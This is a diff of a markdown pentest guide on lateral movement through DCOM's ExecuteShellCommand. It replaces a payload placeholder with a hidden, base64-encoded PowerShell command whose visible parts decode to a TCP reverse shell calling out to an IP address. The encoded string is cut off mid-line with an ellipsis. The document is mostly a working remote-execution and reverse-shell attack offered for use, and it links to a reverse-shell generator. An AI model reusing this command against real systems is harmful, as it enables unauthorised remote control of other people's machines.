@@ -38,7 +38,8 @@ $dcom.Document.ActiveView.ExecuteShellCommand("cmd", $null, "/c calc", "7")
 **Step 1: Generate Base64 Payload**  [PowerShell_RCE](https://github.com/MGamalCYSEC/ReverseShellCrafter/tree/main/PowerShell)
 **Step 2: Execute Payload via DCOM**  
 ```powershell
-$dcom.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-nop -w hidden -e <BASE64_PAYLOAD>", "7")
+$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
 ```  
 - Replace `<BASE64_PAYLOAD>` with your encoded shell.  
 
